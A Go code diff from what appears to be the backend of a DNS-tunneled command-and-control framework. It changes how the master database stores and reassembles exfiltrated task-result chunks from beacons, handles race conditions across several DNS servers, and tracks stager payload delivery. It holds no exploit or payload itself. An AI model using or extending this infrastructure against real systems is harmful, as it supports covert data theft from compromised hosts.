@@ -366,10 +366,10 @@ func (d *MasterDatabase) GetPendingMissingChunks(maxAge time.Duration) ([]Missin
 
 // getMissingTaskChunks returns which chunk indices are missing for a task
 func (d *MasterDatabase) getMissingTaskChunks(taskID string, totalChunks int) []int {
-	// Get all chunk indices we have
+	// Get all chunk indices we have from task_results (where SaveResultChunk stores them)
 	rows, err := d.db.Query(`
-		SELECT DISTINCT chunk_index FROM task_result_chunks
-		WHERE task_id = ?
+		SELECT DISTINCT chunk_index FROM task_results
+		WHERE task_id = ? AND chunk_index > 0
 		ORDER BY chunk_index
 	`, taskID)
 	if err != nil {
@@ -433,12 +433,14 @@ func (d *MasterDatabase) ReceiveMissingChunks(taskID string, chunks map[int][]by
 	d.mutex.Lock()
 	defer d.mutex.Unlock()
 
+	now := time.Now().Unix()
 	for chunkIndex, data := range chunks {
+		// Store in task_results (same table as SaveResultChunk uses)
 		_, err := d.db.Exec(`
-			INSERT OR IGNORE INTO task_result_chunks 
-			(task_id, chunk_index, chunk_data, dns_server_id, received_at)
-			VALUES (?, ?, ?, ?, ?)
-		`, taskID, chunkIndex, data, dnsServerID, time.Now().Unix())
+			INSERT OR IGNORE INTO task_results 
+			(task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
+			VALUES (?, '', ?, ?, ?, ?, 0, 0)
+		`, taskID, dnsServerID, string(data), now, chunkIndex)
 		if err != nil {
 			return fmt.Errorf("failed to save chunk %d: %w", chunkIndex, err)
 		}
@@ -448,7 +450,7 @@ func (d *MasterDatabase) ReceiveMissingChunks(taskID string, chunks map[int][]by
 	_, totalChunks, hasPending := d.getPendingCompletionUnlocked(taskID)
 	if hasPending {
 		count := 0
-		d.db.QueryRow(`SELECT COUNT(*) FROM task_result_chunks WHERE task_id = ?`, taskID).Scan(&count)
+		d.db.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM task_results WHERE task_id = ? AND chunk_index > 0`, taskID).Scan(&count)
 		if count >= totalChunks {
 			// All chunks received, trigger reassembly
 			go func() {
@@ -486,10 +488,10 @@ func (d *MasterDatabase) clearPendingCompletionUnlocked(taskID string) {
 
 // reassembleTaskResultUnlocked attempts to reassemble a task result (must hold mutex)
 func (d *MasterDatabase) reassembleTaskResultUnlocked(taskID string, totalChunks int) {
-	// Get all chunks in order
+	// Get all chunks in order from task_results
 	rows, err := d.db.Query(`
-		SELECT chunk_data FROM task_result_chunks
-		WHERE task_id = ?
+		SELECT result_data FROM task_results
+		WHERE task_id = ? AND chunk_index > 0
 		ORDER BY chunk_index ASC
 	`, taskID)
 	if err != nil {
@@ -498,28 +500,36 @@ func (d *MasterDatabase) reassembleTaskResultUnlocked(taskID string, totalChunks
 	}
 	defer rows.Close()
 
-	var result []byte
+	var chunks []string
 	for rows.Next() {
-		var chunk []byte
+		var chunk string
 		if err := rows.Scan(&chunk); err == nil {
-			result = append(result, chunk...)
+			chunks = append(chunks, chunk)
 		}
 	}
 
-	// Store assembled result
+	if len(chunks) < totalChunks {
+		fmt.Printf("[Master DB] Warning: reassembly has %d chunks but expected %d\n", len(chunks), totalChunks)
+	}
+
+	// Assemble result
+	result := strings.Join(chunks, "")
+
+	// Store assembled result as chunk_index=0 (convention for assembled results)
 	now := time.Now().Unix()
 	_, err = d.db.Exec(`
-		INSERT OR REPLACE INTO task_results (task_id, result, completed_at)
-		VALUES (?, ?, ?)
-	`, taskID, result, now)
+		INSERT OR REPLACE INTO task_results (task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
+		VALUES (?, '', 'master-recovered', ?, ?, 0, ?, 1)
+	`, taskID, result, now, totalChunks)
 	if err != nil {
 		fmt.Printf("[Master DB] Failed to store reassembled result: %v\n", err)
 		return
 	}
 
 	// Update task status
-	d.db.Exec(`UPDATE tasks SET status = 'completed' WHERE id = ?`, taskID)
-	fmt.Printf("[Master DB] ✓ Reassembled task %s from missing chunks (%d bytes)\n", taskID, len(result))
+	d.db.Exec(`UPDATE tasks SET status = 'completed', result_size = ?, completed_at = ?, updated_at = ? WHERE id = ?`, 
+		len(result), now, now, taskID)
+	fmt.Printf("[Master DB] ✓ Reassembled task %s from recovered chunks (%d bytes)\n", taskID, len(result))
 }
 
 // ReceiveMissingExfilChunks processes missing exfil chunks sent by a DNS server
@@ -1681,7 +1691,9 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 	if chunkIndex >= 1 || (chunkIndex == 0 && totalChunks > 1) {
 		var currentStatus string
 		err := d.db.QueryRow("SELECT status FROM tasks WHERE id = ?", taskID).Scan(&currentStatus)
+		statusWasSent := false
 		if err == nil && currentStatus == "sent" {
+			statusWasSent = true
 			now := time.Now().Unix()
 			_, err = d.db.Exec("UPDATE tasks SET status = ?, updated_at = ? WHERE id = ?", "exfiltrating", now, taskID)
 			if err == nil {
@@ -1689,12 +1701,23 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 			}
 		}
 
-		// SHADOW MESH: If single-chunk result arrived AFTER RESULT_COMPLETE was received
-		// (task status is "exfiltrating" but completion was signaled from different DNS server)
-		// Mark task as completed now that we have the data
-		if err == nil && currentStatus == "exfiltrating" && chunkIndex == 1 && totalChunks == 1 {
-			fmt.Printf("[Master DB] Single-chunk result arrived after completion signal, marking complete now\n")
-			d.markTaskCompleted(taskID)
+		// SHADOW MESH: Check for pending completions when single-chunk result arrives
+		// This handles race condition where RESULT_COMPLETE arrived before data
+		// Check both when status was "exfiltrating" OR when we just transitioned from "sent"
+		if err == nil && chunkIndex == 1 && (currentStatus == "exfiltrating" || statusWasSent) {
+			// Check if there's a pending completion for this task
+			_, pendingTotalChunks, hasPending := d.getPendingCompletion(taskID)
+			
+			// Complete if: known single-chunk OR pending completion says it's single-chunk
+			if totalChunks == 1 || (hasPending && pendingTotalChunks == 1) {
+				fmt.Printf("[Master DB] Single-chunk result arrived after completion signal, marking complete now\n")
+				// Update the chunk to have correct total_chunks if it was 0
+				if totalChunks == 0 && pendingTotalChunks == 1 {
+					d.db.Exec(`UPDATE task_results SET total_chunks = 1, is_complete = 1 WHERE task_id = ? AND chunk_index = 1`, taskID)
+				}
+				d.markTaskCompleted(taskID)
+				d.clearPendingCompletion(taskID)
+			}
 		}
 	}
 
@@ -2991,17 +3014,24 @@ func (d *MasterDatabase) MarkStagerChunkDelivered(sessionID string, chunkIndex i
 		// Check if row was actually inserted (rowsAffected = 0 means conflict, already exists)
 		rowsAffected, _ := result.RowsAffected()
 		if rowsAffected == 0 {
-			// Chunk already reported by another DNS server - just update activity
-			d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
-			return nil
+			// Chunk already reported by another DNS server
+			// STILL update chunks_delivered to track highest chunk index seen (Shadow Mesh fix)
+			// This handles case where different DNS servers report different chunks
+			_, err = d.db.Exec(`
+				UPDATE stager_sessions 
+				SET chunks_delivered = MAX(chunks_delivered, ?), last_activity = ?
+				WHERE id = ?
+			`, chunkIndex+1, now, sessionID)
+			return err
 		}
 
-		// Successfully inserted new chunk - increment chunks_delivered counter
+		// Successfully inserted new chunk - update chunks_delivered to max(current, chunkIndex+1)
+		// Since DNS servers only report every 100th chunk, chunkIndex+1 represents actual progress
 		_, err = d.db.Exec(`
 			UPDATE stager_sessions 
-			SET chunks_delivered = chunks_delivered + 1, last_activity = ?
+			SET chunks_delivered = MAX(chunks_delivered, ?), last_activity = ?
 			WHERE id = ?
-		`, now, sessionID)
+		`, chunkIndex+1, now, sessionID)
 
 		return err
 	}
@@ -3024,12 +3054,13 @@ func (d *MasterDatabase) MarkStagerChunkDelivered(sessionID string, chunkIndex i
 		return err
 	}
 
-	// Increment session chunks_delivered count (only once per chunk)
+	// Update session chunks_delivered to max(current, chunkIndex+1)
+	// Since DNS servers only report every 100th chunk, chunkIndex+1 represents actual progress
 	_, err = d.db.Exec(`
 		UPDATE stager_sessions 
-		SET chunks_delivered = chunks_delivered + 1, last_activity = ?
+		SET chunks_delivered = MAX(chunks_delivered, ?), last_activity = ?
 		WHERE id = ?
-	`, now, sessionID)
+	`, chunkIndex+1, now, sessionID)
 
 	return err
 }
